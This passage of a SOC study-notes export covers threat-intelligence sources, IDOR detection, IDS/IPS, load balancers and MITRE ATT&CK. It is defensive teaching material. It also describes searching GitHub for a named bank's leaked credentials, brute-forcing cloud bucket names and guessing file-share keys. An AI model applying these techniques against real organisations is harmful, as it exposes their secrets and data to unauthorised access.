developer.shodan.io/api and see how data can be retrieved via the API.\nOther search engines alternative to Shodan are “BinaryEdge”, “Zoomeye”, and “Censys”.\nResources Providing IOCs\nCollecting IPs, domains, hashes, and C2s is one of the most important methods to protect from potential attacks. Collecting these artifacts that belong to newly emerged threat actors allows us to detect these malicious actors and protect our systems before they are infected and also to take early actions when an activity related to these IOCs is observed in our systems.\nResources such as Alienvault, Malwarebazaar, Abuse.ch, Malshare, Anyrun, Virustotal, Hybrid-Analysis, Totalhash, Phishunt, Spamhaus, Tor Exit Nodes, Urlscan, Zone-h, Rats, Sorbs, Barracuda and many more can provide us with IOCs. One of the most basic rules here is to have a list of sources as wide as possible and to pull data from these sources as often as possible. Almost all of the sources that provide IOC provide data via API. Just like Shodan, we can pull data from these sources via API and then reach the lowest possible false positive rate through some data elimination methods like whitelisting, etc.\nHacker Forums\nHacker forums are one of the most important places to gather intelligence. Threat actors usually share in hacker forums first when they are in preparation for an attack or before they launch a campaign against an organization or a country. By analyzing the posts they made in these forums, we can find answers to critical questions such as the direction of the attack, the targets, the methods to be used in the attack, and who is behind the attack.\nSometimes, sales of access to hacked systems are common on these forums. In such cases, even if we are compromised, the remediation issues such as closing the access to our systems outside of our network, to avoid the access of more dangerous people and determining the root cause of the incident should be addressed. Below are screenshots of content shared on hacker forums:\n\n\n\n\n\n\n\n\n\nRansomware Blogs\nRansomware blogs are one of the sources that have gained popularity with the start of the Covid-19 pandemic. Ransomware groups have ramped up their activities as of 2020 and started posting the data of their victims who refused to pay on their blogs. In addition, they have been making their announcements through these blogs. These blogs should definitely be resources that we should monitor closely to find answers to questions such as which organization is targeted by which group, which groups are targeting which countries, what their motivations are, and to gather more intelligence on ransomware groups. Some of the most popular ransomware groups today are; Lockbit, Conti, Revil, Hive, Babuk. You can view the active ransomware groups from the link below and view the links to their blogs:\nransomwr3tsydeii4q43vazm7wofla5ujdajquitomtd47cxjtfgwyyd.onion/\nWe need to install the Tor Browser to be able to visit the sites with the .onion extensions as .onion extensions are not accessible via regular browsers. Tor Browser can be downloaded from torproject.org.\nBelow are some screenshots from ransomware blogs:\n\n\n\nBlack Markets\nBlack Markets are like more systematized versions of the posts in the “Selling” categories in the hacker forums. In black markets, credit cards, stealer logs, RDP accesses, and prepaid accounts are generally sold.\nSince the data to be collected from here contains limited information, it will not have an actionable output on its own. However, as explained before, if an attack surface has been created and if the collected data matches any data on the attack surface, then it will produce an actionable output. As black markets don’t provide data via API, we can extract data from the black markets only by sending requests with scripts we write and by parsing the returned requests. Below are screenshots from some black markets.\n\n\n\n\nChatters\nPlatforms, where bilateral or multiple written, and audio-visual communications are possible, are important in terms of threat intelligence. Threat actors may share sensitive data throughout their communications with each other on these chatters or important information or documents regarding the preparation of an attack may be disclosed. This is why we should follow the chatters as possible as we can and record everything on those chatters into our database as much as possible. Today, popular chatters frequently used by threat actors are applications such as Telegram, ICQ, IRC, and Discord. It is possible to see posts selling credit cards, accounts, and sales for direct access to companies on some groups on these platforms. Below are screenshots of some chatters.\n\n\nCode Repositories\nCode Repositories are full of sensitive data that has been forgotten in them. Organizations or individual users may forget database access information, login information, sensitive configuration files for their applications, secret API keys, etc. in the code repositories. This information may sometimes be detected by malicious actors and leveraged in their attacks. Therefore, monitoring public code repositories is important from the threat intelligence perspective. In addition, when a new vulnerability is announced, its exploit is often uploaded to these code repositories and it is important to identify them. Github, Gitlab, and Bitbucket are some of the popular code repository applications. It is possible to find sensitive data when searching with certain parameters in these applications. For example, let’s search for “password” “abanca.com” in github.\n\nAs the screenshots show, we have 40 results for our search for “password” and “abanca.com” keywords. When we review these results we clearly see that the secret API key of Abanca is left open in the second file.\n\nThis information may belong to the organization or a third party that provides services, but either way, it is obvious that it is highly risky that this data is open in this way.\nFile Share Websites\nFile share sites are applications that many threat actors use actively. They can share files anonymously through these sites. Files uploaded on these platforms do belong to a specific organization, sometimes to a country. Confidential documents of these organizations may be distributed through these file share sites in case of a breach of these organizations. Monitoring of these sites is important from the threat intelligence aspect as we will be aware of the shares about an organization that we follow. Thus, if there is a breach, it can be detected as early as possible. Popular sites that allow file uploading anonymously are sites such as Anonfiles, Mediafire, Uploadfiles, WeTransfer, File.io. We cannot download files from these sites directly, therefore, we need to use different methods other than API to extract data from them. There are 2 different methods to download data from these sites. First, before guessing the file name on such sites, we detect the unique keys produced for that file through the guessing algorithm, and then by sending a request to the application server with that key we can retrieve the file in the returned response. This method is costly because it requires large processing power. The second method is a simpler method with a very low cost. When you upload any file to these sites as public, it is observed that browsers index these files after a while. These indexed files can be captured and pulled to our own servers by using Dork through a script. Dork is queries that allow us to search more effectively and quickly.\nPublic Buckets\nBucket applications are cloud-based environments that organizations or individuals use to store their data. These environments should be closed to the outside of the network and only the authorized users of the organization should access them. But this is not the case all the time and these environments may be left wide open which causes the disclosure of sensitive and confidential data. For this reason, buckets left as the public have been an important source of threat intelligence. In order to detect these public buckets and to find the endpoints, brute force attempts can be made. Let’s say there is a structure named “bucketname.amazonaws.com”, we can detect existing buckets by brute force in the bucket name field in this structure, and then search for files under that endpoint. It is sufficient to have a wordlist containing the names of the organization for this. Popular applications include Amazon S3 Buckets, Azure Blobs, and Google Cloud Storage.\nHoneypots\nHoneypots are one of the most effective ways to catch the attackers. Systems that are easy to breach are very attractive to attackers. Honeypots are basically systems with security vulnerabilities that are not connected to any critical server or system that works with the logic of trapping. It is intended for attackers to attack honeypots so we can actively collect IOCs such as attacker IPs and use them in our own systems. If we wish, we can build our own honeypot or we can use popular honeypots that are already active. Kippo, Cowrite, Glastopf, Nodepot, Google Hack Honeypot, ElasticHoney, Honeymail are some of the popular honeypots.\nSIEM/IDS/IPS/Firewalls\nAn institution may receive hundreds of attacks per day and these attacks may be prevented by the written rules on the security products used. One of the most effective sources of intelligence is the logs of these security products. The logs collected in SIEM or the logs containing the blocked IP addresses of the firewall will give us good information about the attackers. We can obtain the list that contains the attacker’s IPs by filtering these logs. Also, the hash of a malicious file captured on the SIEM is intelligence for us. It will always keep us one step ahead if we see the products we use within the organization as critical resources and use them effectively by creating rules and scripts to collect data from these sources."},"SOC/Hash":{"slug":"SOC/Hash","filePath":"SOC/Hash.md","title":"Hash","links":[],"tags":[],"content":"A hash value is a numeric value of a fixed length that uniquely identifies data. It is the result of a hashing algorithm.\nCommon Hash Types\nMD5\n(Message Digest, defined by RFC 1321\nMD5 is a widely used cryptographic hash function with a 128-bit hash value. MD5 hashes are NOT considered cryptographically secure. In 2011, the IETF published RFC 6151, “Updated Security Considerations for the MD5 Message-Digest and the HMAC-MD5 Algorithms,” which mentioned a number of attacks against MD5 hashes, including the hash collision.\nSHA-1\n(Secure Hash Algorithm 1, defined by RFC 3174)\nWhen data is fed to SHA-1 Hashing Algorithm, SHA-1 takes an input and produces a 160-bit hash value string as a 40 digit hexadecimal number. NIST deprecated the use of SHA-1 in 2011 and banned its use for digital signatures at the end of 2013 based on it being susceptible to brute-force attacks. Instead, NIST recommends migrating from SHA-1 to stronger hash algorithms in the SHA-2 and SHA-3 families.\nSHA-2\n(Secure Hash Algorithm 2)\nSHA-2 Hashing Algorithm was designed in 2001 to replace SHA-1. SHA-2 has many variants, and arguably the most common is SHA-256. The SHA-256 algorithm returns a hash value of 256-bits as a 64 digit hexadecimal number."},"SOC/How-Web-Applications-Work":{"slug":"SOC/How-Web-Applications-Work","filePath":"SOC/How Web Applications Work.md","title":"How Web Applications Work","links":["Networking/TCP"],"tags":[],"content":"HTTP Requests\nAn HTTP request is used to retrieve a specific resource from a web server. The web server’s job is to process the response received and present it to the user.\nAll requests must conform to a standard HTTP format so that web servers can understand the request. If the request is sent in a different format, the web server will not recognize it and will return an error to the user, or the web server may not be able to provide service (which is another type of attack).\n\nAn HTTP request consists of a request line, request headers, and a request message body. The request line consists of the HTTP method and the resource requested from the web server.\nThe request headers contain certain headers that the server will process.\nThe request message body contains the data to be sent to the server.\nThe image above shows an example of an HTTP request. Let’s examine this HTTP request line by line.\n\n\nThe GET method indicates that the resource ”/” is being requested from the server. Because there is no name, a symbol like ”/” means that the main page of the web server is being requested.\n\n\nNowadays there are web applications that belong to more than one domain found on a single web server, so browsers use the “Host” header to identify which domain the requested resource belongs to.\n\n\nWhen a web application wants to store information on the client’s device, it stores it in a “cookie” header. Cookies are typically used to store session information. This saves you from having to re-enter your username and password when you visit a web application that requires you to log in.\n\n\nThe “Upgrade-Insecure-Requests” header indicates that the client wants to communicate using encryption (SSL).\n\n\nThe “User-Agent” header contains information about the client’s browser and operating system. Web servers use this information to send specific HTTP responses to the client. You can find some automated vulnerability scanners by looking under this header.\n\n\nThe type of data requested is in the “Accept” header.\n\n\nThe type of encoding accepted by the client is found in the “Accept-Encoding” header. You can usually find the names of compression algorithms under this header.\n\n\nThe “Accept-Language” header contains the client’s language information. The web server uses this information to display the prepared content in the client’s language.\n\n\nThe “Connection” header shows how the HTTP connection is made. If there is data such as “close”, it means that the TCP connection will be closed after receiving the HTTP response. If you see “keep-alive”, this means that the connection will be maintained.\n\n\nAn empty line is inserted between the HTTP request header and the HTTP request message body to create a partition.\n\n\nAny other data to be sent to the web application is in the Request Message Body. If the HTTP POST method is used, then the POST parameters can be found here.\n\n\nHTTP Responses\nWhen the web server receives an HTTP request, it performs the necessary checks and processes and then sends the requested resource to the client. There is no standard process, as there are many technologies and designs involved. The server may pull data from the database depending on what the requested resource is, or it may process the incoming data. However, the HTTP Response Message must reach the client after all the processing.\nAn HTTP response message contains a Status Line, Response Headers, and a Response Body.\n\nThe Status line contains the status code (e.g. 200: OK) and HTTP protocol information.\nThe Response Header has some headers are used for a variety of purposes.\nThe Response Body contains information about the requested resource.\n\nIf a web page has been requested, there will usually be HTML code in the Response Body. When the client receives the HTML code, the web browser will process the HTML code and display the web page.\n\nLet’s examine an HTTP response request using this image.\nStatus Line\nThe Status Line contains information about the HTTP version and the HTTP Response Status Code. The HTTP Response Status Code is used to describe the status of the request. There are many HTTP response status codes, but they can be summarized as follows:\n-      100-199: Informational responses\n-      200-299: Successful responses\n-      300-399: Redirection message\n-      400-499: Client error responses\n-      500-599: Server error responses\nResponse Headers\nHere are some HTTP Response Headers that you may encounter frequently:\n-      Date: The exact time the server sent the HTTP Response to the client.\n-      Connection: This indicates how the connection is handled, just like the HTTP Request header.\n-      Server: It informs about the operating system of the server and the version of the web server.\n-      Last-Modified: It provides information about when the requested resource was modified. This header is used by the caching mechanism.\n-      Content-Type:  The type of data being sent.\n-      Content-Length: The size of the data sent. \nResponse Body\nThe HTTP response body contains the resource sent by the server and requested by the client.\n"},"SOC/IDOR-Attack":{"slug":"SOC/IDOR-Attack","filePath":"SOC/IDOR Attack.md","title":"IDOR Attack","links":[],"tags":[],"content":"What is IDOR?\nInsecure Direct Object Reference (IDOR) is a vulnerability caused by the absence or improper use of an authorization mechanism. It allows one person to access an object that belongs to another.\n\nIDOR, or “Broken Access Control”, is the number one web application vulnerability listed in the 2021 OWASP.\nHow IDOR Works\nIDOR is not a vulnerability caused by poor sanitation like other web application-based vulnerabilities. The attacker manipulates the parameters sent to the web application, gains access to an object that doesn’t belong to him, and is then able to read, modify, or delete the contents.\nHere’s an example to better understand how the IDOR vulnerability is exploited.\nImagine a simple web application. It retrieves the “id” variable from the user and then displays data that belongs to the user who made the request.\nURL: letsdefend.io/get_user_information\nWhen a request like the one above is made in our web application, it displays the information of the user with an id value of 1.\nIf I am the user who made the request and my ID value is 1, everything will work normally. When I make the request, I see my personal information.\nBut what happens if we make a request with 2 as the “id” parameter? Or 3?\nIf the web application does not check that the “id” value in the request belongs to the person making the request, then anyone can make that request and see the user’s information. This web vulnerability is called IDOR.\nAttackers can access items that do not belong to them by changing parameters such as the “id”. The type of information they can access may vary depending on the web application, but either way, you wouldn’t want anyone to access your personal information, so this is very critical.\nHow Attackers Take Advantage of IDOR Attacks\nWhat an attacker can do is limited by the scope of an IDOR vulnerability. However, the most common areas are usually pages where a user’s information is received. If an attacker were to exploit an IDOR vulnerability, they could:\n\nSteal personal information\nAccess unauthorized documents \nTake unauthorized actions (such as deleting, modifying)\n\nHow to Prevent IDOR\nAlways check that the person making the request is authorized to provide a secure environment without an IDOR vulnerability.\nIn addition, unnecessary parameters should be removed and only the minimum number of parameters should be taken from the user. If we think about the previous example, we don’t need to get the “id” parameter. Instead of getting the “id” parameter from the user, we can use the session information to identify the person who made the request.\nDetecting IDOR Attacks\nIDOR attacks are harder to detect than other attacks. This is because it does not have certain payloads such as SQL injection and XSS.\nHTTP responses would help identify IDOR attacks. However, HTTP responses are not logged for several reasons. This makes it more difficult to identify IDOR attacks.\nA number of methods can be used to identify IDOR attacks. These are:\n\nCheck all parameters: An IDOR vulnerability can occur in any parameter. Therefore, do not forget to check all parameters.\nLook at the number of requests made to the same page: When attackers discover an IDOR vulnerability, they usually want to access the information of all the other users, so they typically perform a brute-force attack. This is why you may see many requests for the same page from one source.\nTry to find a pattern: Attackers will plan a brute-force attack to reach all objects. Since they will be performing the attack on successive and predictable values, such as whole numbers, you can try to find a pattern in the requests you see. For example, if you see requests like id=1, id=2, id=3, you might be suspicious.\n\nA Detection Example\nBelow is a screenshot of logs found on a web server running WordPress.\n\nAs with our other examples, let’s start with a general, broad search. As there are no special characters in the requests made, we can easily read the logs.\nIf you have used Wordpress before, you may know that the “wp-admin/user-edit.php” page contains information about registered Wordpress users. It might seem normal to be able to access this page, in fact, if you have more than one registered user you might be able to access it with more than one “user_id:” parameter. But it is abnormal to have so many different “user_id” parameters.\nIt looks like we have an IDOR attack on our hands.\nWhen we look at the source IP, we see that it belongs to Cloudflare. This means that the web application for which we have got the access log was using a service provided by Cloudflare. So the requests were being sent to the web application through Cloudflare.\nThe fact that the access logs record 15-16 requests within the short time frame shows us that the attack is being carried out with an automated device. If we look at the User-Agent header, we can see that it says “wfuzz/3.1.0”. Wfuzz is a tool that is often used by attackers. So not only have we established that this attack was carried out by an automated scanning tool, but we have also established that it was carried out by a tool called Wfuzz.\nBut we still haven’t answered the most important question.\nWas the attack successful?\nDid the attacker gain access to the users’ information?\nOur job would be easier if we had the HTTP responses. But since we don’t have the HTTP responses, let’s look at the response size in the access logs and make an inference.\nAs we mentioned earlier, the requested page displayed user information. Information such as user names, surnames, and the total size of the user names will not be the same. Therefore, we can ignore requests with a response size of 479 bytes.\nLooking at the requests with response sizes 5691 and 5692, we can see that the response code is 302 (redirect). Successful web requests are usually returned with a response code of 200. So we can assume that the attack was unsuccessful. However, this information alone may not be enough to determine that the attack was definitely unsuccessful.\nThere are 10 requests with the response size of 5692 and 4 with the response size of 5691.\nAs we mentioned before, there is a very small chance that the sum of all information such as user name, surname, and username will be the exact same. This increases the likelihood that the attack was not successful."},"SOC/Intrusion-Detection-System-(IDS)":{"slug":"SOC/Intrusion-Detection-System-(IDS)","filePath":"SOC/Intrusion Detection System (IDS).md","title":"Intrusion Detection System (IDS)","links":[],"tags":[],"content":"What is IDS?\nAn Intrusion Detection System (IDS) is hardware or software used to detect security breaches and attacks by monitoring a network or host.\nTypes of IDS\nThere are many different types of IDS products:\n\nNetwork Intrusion Detection System (NIDS)\nA Network Intrusion Detection System (NIDS) detects whether there is traffic indicative of attacker behavior by passing all traffic on the network through it. When abnormal behavior is observed in the traffic, an alert can be generated and the administrator can be informed.\nHost Intrusion Detection System (HIDS)\nA Host Intrusion Detection System (HIDS) works on a specific host in the network. It tries to detect malicious activities by examining all network packets coming to this device and all network packets going from this device. Detected malicious behaviors are reported to the administrator as an alert.\nProtocol-Based Intrusion Detection System (PIDS)\nA Protocol-Based Intrusion Detection System (PIDS) is a type of IDS that examines the traffic between a server and a client in a protocol-specific way.\nApplication Protocol-Based Intrusion Detection System (APIDS)\nAn Application Protocol-Based Intrusion Detection System (APIDS) is a type of IDS that tries to detect security breaches by monitoring communication in application-specific protocols.\nHybrid Intrusion Detection System\nA Hybrid Intrusion Detection System is a type of IDS in which two or more violation detection approaches are used together.\nFunctions of IDS\n\nDetecting security breaches according to the detection methods used by the IDS product is the main task of the IDS product.\nWhen IDS detects a security breach, the administrator is informed, and/or this information is sent to the SIEM product.\n\nNote: For detailed information about “SIEM”, you can refer to the [SIEM 101 training](app.letsdefend.io/training/lessons/siem-101.\nImportance of IDS for Security\nIDS is a product developed to detect malicious behavior. It can be said that security is lacking in a network without IDS because IDS is one of the products that has reached a certain technological maturity. Due to its task, it is very important to detect security breaches. It is recommended to be used with other security products rather than alone. Since the IDS product does not have the ability to take action, it will be more effective to use it with a security product that has the ability to take additional action.\nSome popular IDS products used in the cybersecurity industry are as follows:\n\nZeek/Bro\nSnort\nSuricata\nFail2Ban\nOSSEC\n\nWhat log sources does the IDS have?\nDuring its operation, IDS detects security violations according to previously established rules. Therefore, it is very important how well the written rule defines the attack. If the written rule cannot detect the attack or detects normal behavior as an anomaly, the rule should be changed or the incoming alerts should be reviewed by the analyst. Among the IDS logs examined by the analyst, there is information in the network packets regarding the security breach.\nNote: For detailed information about IDS logs, you can refer to the Network Log Analysis training.\nPhysical Location of the IDS Device\nThe location of the IDS device in the network may vary depending on which type of IDS it is. For example, a NIDS-type device must pass all packets coming into the network over it. Therefore, it is more suitable to be positioned close to the network devices that provide access to the external network. A HIDS-type device, on the other hand, should be positioned close to the host in the network because it only examines the network packets coming to and leaving a certain host.\n"},"SOC/Intrusion-Prevention-System-(IPS)":{"slug":"SOC/Intrusion-Prevention-System-(IPS)","filePath":"SOC/Intrusion Prevention System (IPS).md","title":"Intrusion Prevention System (IPS)","links":[],"tags":[],"content":"What is IPS?\nAn Intrusion Prevention System (IPS) is hardware or software that detects security violations by monitoring a network or host and prevents security violations by taking the necessary action.\nTypes of IPS\nThere are many different types of IPS products:\n\n1. Network-Based Intrusion Prevention System (NIPS)\nNetwork-based intrusion prevention system (NIPS) is a type of IPS that detects security violations and eliminates security violations by monitoring all incoming traffic to the network it is in.\n2. Host-Based Intrusion Prevention System (HIPS)\nHost-based intrusion prevention system (HIPS) is software that monitors and analyzes suspicious activities for a host.\n3. Network Behavior Analysis (NBA)\nNetwork Behavior Analysis (NBA) is a type of IPS that detects and blocks unusual traffic flows and Denial of Service (DoS) attacks on the network.\n4. Wireless Intrusion Prevention System (WIPS)\nA Wireless Intrusion Prevention System (WIPS) is a type of IPS that monitors and analyzes wireless network protocol traffic of wireless devices in a network.\nFunctions of IPS\n\nIPS is responsible for preventing malicious behavior by detecting security breaches.\nIt notifies the relevant authorities of the security breach encountered during monitoring as an alert.\n\nThe Importance of IPS for Security\nIPS is an important security product that should be included in an organization. Having the ability to take action against the security breach it has detected makes a great contribution to ensuring security. As with any security solution, it must be used and configured correctly. It is not recommended to be installed and left to work without constant control by the personnel. It must be followed by the cyber security personnel whether the IPS product is working or not and whether it takes the right action.\nSome popular IPS products used within the cybersecurity industry are as follows:\n\nCisco NGIPS\nSuricata\nFidelis\n\nWhat log resources does IPS have?\nThe IPS device has log content similar to the IDS device. In terms of their duties, IDS and IPS have similar features at one point. Some of the information that can be included in the IPS logs is as follows:\n\nDate/Time Information\nMessage About the Attack\nSource IP Address\nSource Port\nDestination IP Address\nDestination Port\nAction Information\nDevice Name\n\nNote: For detailed information about IPS logs, you can refer to the Network Log Analysis training.\nPhysical Location of IPS Device\nThe location of the IPS device in the network may vary depending on which type of IPS it is. In general terms, it should be placed at whatever point it needs to be located in the network due to its task.\n"},"SOC/Load-Balancer":{"slug":"SOC/Load-Balancer","filePath":"SOC/Load Balancer.md","title":"Load Balancer","links":[],"tags":[],"content":"What is a Load Balancer?\nLoad Balancer is a hardware or software used to distribute the traffic to the servers in a balanced way and is placed in front of the servers.\nBenefits of Load Balancer\nLoad Balancer is an important tool for the IT sector with many advantages. The benefits of the load balancer device, which plays a critical role in the distribution of network traffic, are shown below:\n\nLogic Behind How Load Balancer Operates\nThe load balancer detects the most suitable target using some important mathematical algorithms while performing the load-balancing process and directs the network packets to the appropriate target. In this way, the overloading of a server behind the load balancer is prevented. For example, the possible traffic flow when no load balancer is used is as follows:\n\nAs can be seen in the image above, as an undesirable situation, “server1” has become overloaded and cannot process packets. This situation causes a delay that the user or the client device using the server does not want. To prevent this situation, a load balancer should be used. For example, the following image shows the possible traffic flow when the load balancer device is used:\n\nAs seen in the image above, the resources of the system and servers are used much more effectively with balanced load distribution, preventing delays and loss of access.\nThe Importance of Load Balancer for Security\nThe load balancer is a very important component of an organization due to its duty. Continuing the services of the organization uninterrupted can be very critical for the organization. Therefore, for access security, load balancer devices/software should be placed in the necessary parts and correctly configured and monitored. Otherwise, the services of the organization may be interrupted, causing the organization to experience a loss of prestige or financial loss. For example, if we consider that DoS/DDoS attacks are aimed at preventing the services of the organization, we can more easily understand the importance of load balancers in this sense.\nDoS (Denial of Service): It is called attacking to render the service inoperable by sending more network traffic than the target system can handle. In short, it can be said to cause disruption of the service provided by consuming resources towards the target.\nSome popular Load Balancer products used in the cyber security industry are as follows:\n\nNginx\nF5\nHAProxy\nCitrix\nAzure Traffic Manager\nAWS\n"},"SOC/MITRE-ATT-and-CK-Framework":{"slug":"SOC/MITRE-ATT-and-CK-Framework","filePath":"SOC/MITRE ATT&CK Framework.md","title":"MITRE ATT&CK Framework","links":["SOC/MITRE-ATT-and-CK-Matrix","SOC/MITRE-ATT-and-CK-Tactics","SOC/MITRE-ATT-and-CK-Technics--and--Sub-Techniques","SOC/MITRE-ATT-and-CK-Mitigations","SOC/APT-Groups","SOC/Phishing"],"tags":[],"content":"\nIntroduction\nWhat even is this MITRE thing? 🤔\nMITRE ATT&amp;CK that stands for Adversarial Tactics, Techniques, and Common Knowledge is the framework of a knowledge database that has been continuously developed and expanded along with the technology in cybersecurity\nWhy is it so important? 🤷‍♂️\nEach step of cyber attacks is covered in detail in the MITRE ATT&amp;CK Framework, SOC Analysts can clearly map attacks, prevent them, and an in-depth report can be written and the details of the attack can be archived for a later use. Since this framework provides a clear roadmap of cyber attacks, researches can be conducted on other possible cyber attacks that have not yet occurred yet to develop ways to detect or avoid them.\nThe Framework\n1. MITRE ATT&amp;CK Matrix\n2. MITRE ATT&amp;CK Tactics\n3. MITRE ATT&amp;CK Technics &amp; Sub-Techniques\n4. MITRE ATT&amp;CK Mitigations\n5. MIRE ATT&amp;CK Software\n6. APT Groups\nNext: Phishing"},"SOC/MITRE-ATT-and-CK-Matrix":{"slug":"SOC/MITRE-ATT-and-CK-Matrix","filePath":"SOC/MITRE ATT&CK Matrix.md","title":"MITRE ATT&CK Matrix","links":["SOC/MITRE-ATT-and-CK-Framework"],"tags":[],"content":"What is ATT&amp;CK Matrix? 🤔\nMITRE ATT&amp;CK Matrix is a visualization method used to classify and see attack methods of cyber attackers. Matrices can be customized for almost any subject and turned into useful visuals. MITRE has created MITRE ATT&amp;CK matrices to visualize the details of attacker behavior using the matrices.\nTypes of Matrices 🌳\n3 different matrices have been created within the MITRE ATT&amp;CK Framework according to the platform types:\n\nEnterprise Matrix\nMobile Matrix\nICS (Industrial Control Systems) Matrix\n\n1. Enterprise Matrix 🏢\nEnterprise matrix is the first matrix created by MITRE. There are more digital systems included in this matrix and are more common than those that are included in other matrices, so there are a lot more information in this matrix than other matrices. Enterprise matrix is mainly used to understand the cyber attacks on large organizations.\nThe following image shows the enterprise matrix in detail:\n\nSub-matrices 🌿\nThere are 7 sub-matrices under the Enterprise Matrix:\n\nPRE\nWindows\nmacOS\nLinux\nCloud\nNetwork\nContainers\n\nYou can access the Enterprise Matrix and its sub-matrices at the following link and can learn more about them:\nEnterprise Matrix: attack.mitre.org/matrices/enterprise/ \n\n2. Mobile Matrix 📱\nThe mobile matrix is the one that was prepared for mobile devices and contains information about the cyber security of mobile devices. This matrix can be used to ensure the security of individual and corporate mobile devices. Comparing the Enterprise Matrix, it contains less information:\nThe following image shows the mobile matrix:\n\nMobile Matrix: attack.mitre.org/matrices/mobile/ \nSub-matrices 🌿\nMobile Matrix has 2 sub-matrices:\n\nAndroid\niOS\n\n\n3. ICS Matrix 🏭\nThe ICS Matrix is the one that contains the information collected for the cyber security of devices in the industrial control systems. This matrix can be used to provide cyber security and analyses of an ICS.\nThe following image shows the ICS matrix:\n\nICS Matrix: attack.mitre.org/matrices/ics/"},"SOC/MITRE-ATT-and-CK-Mitigations":{"slug":"SOC/MITRE-ATT-and-CK-Mitigations","filePath":"SOC/MITRE ATT&CK Mitigations.md","title":"MITRE ATT&CK Mitigations","links":["MITRE-ATT-and-CK-matrix"],"tags":[],"content":"What are Mitigations?\nMitigations refers to the measures and actions that can be taken in response to the techniques in the MITRE ATT&amp;CK matrix. Each mitigation has a unique ID, name and description that provides clear understanding about them.\ne.g., the image below shows one of the enterprise mitigations:\n\nTypes of Mitigations\nMitigations are grouped into 3 for the matrices as in other MITRE ATT&amp;CK components:\n\nEnterprise Mitigations\nMobile Mitigations\nICS Mitigations\n\nEnterprise Mitigations\n\nThe number of enterprise mitigations: 43\nMobile Mitigations\n\nThe number of mobile mitigations: 11\nICS Mitigations\n\nThe number of ICS mitigations: 51"},"SOC/MITRE-ATT-and-CK-Tactics":{"slug":"SOC/MITRE-ATT-and-CK-Tactics","filePath":"SOC/MITRE ATT&CK Tactics.md","title":"MITRE ATT&CK Tactics","links":["SOC/MITRE-ATT-and-CK-Framework","SOC/Reconnaissance","HTB/Privilege-Escalation"],"tags":[],"content":"What is Tactic?\nTactic expresses the purpose of the cyber attacker and the reason for his action. Tactics are one of the most important MITRE ATT&amp;CK Framework components used to group cyber attacker behaviors and see the attack steps. Tactics are in the top row of the matrix.\ne.g., the tactics on the enterprise matrix are shown in the image below:\n\nTypes of Tactics\nTactics often consist of general statements as they express the purpose and reason for the cyber attack. Therefore, the tactics for each matrix are highly similar.\nFor example, the image below shows detailed information about the “Initial Access” tactic belonging to the enterprise matrix:\n\nThe tactic numbers and names in each matrix are given in the titles below.\n1. Enterprise Tactics \nThere are 14 tactics in the Enterprise matrix as in the list below:\n\nReconnaissance\nResource Development\nInitial Access\nExecution\nPersistence\nPrivilege Escalation\nDefense Evasion\nCredential Access\nDiscovery\nLateral Movement\nCollection\nCommand and Control\nExfiltration\nImpact\n\nYou can access each tactic under the Enterprise matrix from the navigation menu on the left of the page at the link above.\n2. Mobile Tactics \nThere are 14 tactics in the Mobile matrix as in the list below:\n\nInitial Access\nExecution\nPersistence\nPrivilege Escalation\nDefense Evasion\nCredential Access\nDiscovery\nLateral Movement\nCollection\nCommand and Control\nExfiltration\nImpact\nNetwork Effects\nRemote Service Effects\n\n3. ICS Tactics\nThere are 12 tactics in the ICS matrix as in the list below:\n\nInitial Access\nExecution\nPersistence\nPrivilege Escalation\nEvasion\nDiscovery\nLateral Movement\nCollection\nCommand and Control\nInhibit Response Function\nImpair Process Control\nImpact\n"},"SOC/MITRE-ATT-and-CK-Technics--and--Sub-Techniques":{"slug":"SOC/MITRE-ATT-and-CK-Technics--and--Sub-Techniques","filePath":"SOC/MITRE ATT&CK Technics & Sub-Techniques.md","title":"MITRE ATT&CK Technics & Sub-Techniques","links":["SOC/Reconnaissance"],"tags":[],"content":"What are Techniques and Sub-Techniques?\nThe tactics within the matrix only show what the attackers aim and do not contain detailed information about the attacker’s attack method. The techniques and sub-techniques, on the other hand show the methods used by the attacker to achieve his goal and how he conducted the attack exactly. As an example, some of the techniques on the enterprise matrix are shown in the image below:\n\nThe majority of the areas in the matrix in the image above is techniques. Some techniques have sub-techniques and some do not.\nAs it is shown in the image above, If there are gray areas next to the boxes where the names of the techniques are written in the matrix, it indicates that the technique has a sub-technique. For example, let’s see the sub-techniques of the first 4 techniques under the “Reconnaissance” tactic:\n\nTypes of Techniques and Sub-Techniques\nTechniques are divided into 3 groups according to matrices:\n\nEnterprise Techniques\nMobile Techniques\nICS Techniques\n\nEnterprise Techniques\nThere are quite a number of enterprise techniques and are constantly updated over the time. The current number (10.05.2023) of enterprise techniques and sub-techniques is as follows:\nTechniques: 193\nSub-techniques: 401\nMobile Techniques\nTotal number of mobile techniques is less than the enterprise techniques and they are updated over the time as well. The current number (10.05.2023) of the mobile techniques and sub-techniques is as follows:\nTechniques: 66\nSub-techniques: 41\nICS Techniques\nAs with the techniques of other matrices, ICS techniques are also updated over the  time. The current number (10.05.2023) of ICS techniques and sub-techniques is as follows:\nTechniques: 79\nSub-techniques: 0\nWhat is Procedure?\nThe procedure consists of usage examples of techniques/sub-techniques. It simply shows which tool/software was utilized during the implementation of the technique. In other words, it is the explanation of the practical information on the use of the technique.\nAn example of the procedure for the “OS Credential Dumping” technique is in the image below:\n\nProcedures can also be accessed through the page where the techniques are located."},"SOC/Masquerading":{"slug":"SOC/Masquerading","filePath":"SOC/Masquerading.md","title":"Masquerading","links":["SOC/Masquerading"],"tags":[],"content":"Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading."},"SOC/Network-Propagation":{"slug":"SOC/Network-Propagation","filePath":"SOC/Network Propagation.md","title":"Network Propagation","links":["SOC/C2","HTB/Privilege-Escalation"],"tags":[],"content":"After a device is exploited in a network, the adversary spreads its access through the network.\nExploiting more devices in the same network becomes a lot more easier because usually:\n\nCredentials to other devices may be insecurely stored on host\nHost might have exclusive access to other devices such as printers and storages, not open to public\n\nHence, the attacker would set up a base on one of the systems to act as their pivot point and use it to gather information about the internal network.\nNetwork Propagation Process\n\nPivoting\n(MITRE Tactic TA0008)\nOnce the attacker has access to the system, they would use it as their staging site and a tunnel between their C2 Server and the victim’s network. The system would also be used as the distribution point for all malware and backdoors at later stages.\nDiscovery\n(MITRE Tactic TA0007)\nThe adversary would uncover information about the system and the network it is connected to. Within this stage, the knowledge base would be built from the active user accounts, the permissions granted, applications and software in use, web browser activity, files, directories and network shares, and system 